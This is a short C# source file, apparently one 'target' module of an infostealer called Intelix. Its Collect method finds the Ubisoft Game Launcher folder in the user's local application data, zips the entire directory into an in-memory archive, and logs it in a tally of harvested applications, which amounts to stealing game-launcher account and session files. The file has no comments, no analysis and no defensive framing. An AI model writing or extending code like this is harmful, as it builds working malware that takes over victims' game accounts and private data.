using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games;

public class Uplay : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");
		if (Directory.Exists(text))
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Uplay";
			zip.AddDirectoryFiles(text, "Uplay");
			counterApplications.Files.Add(text + " => \\Uplay");
			counterApplications.Files.Add("Uplay\\");
			counter.Games.Add(counterApplications);
		}
	}
}
